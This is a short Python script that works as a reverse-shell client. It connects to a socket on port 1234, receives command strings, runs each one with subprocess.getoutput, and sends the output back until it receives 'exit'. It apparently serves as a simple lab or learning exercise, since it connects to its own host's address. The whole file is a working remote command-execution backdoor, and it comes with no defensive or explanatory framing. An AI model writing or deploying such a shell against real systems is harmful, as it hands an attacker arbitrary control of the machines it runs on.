import socket
import subprocess



#Grab client IP address
CLIENT_HOSTNAME = socket.gethostname()
CLIENT_IP=socket.gethostbyname(CLIENT_HOSTNAME)
PORT=1234

#Create socket
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#IP address for the server
s.connect((CLIENT_IP, PORT))

message = s.recv(1024).decode()
print(message)
#Recieving Loop
while True:

    command2Execute = s.recv(1024).decode()
    #end connection
    if command2Execute.lower() == "exit":
        break
    commandResults = subprocess.getoutput(command2Execute)
    s.send(str(commandResults).encode())
#End connection to server
s.close()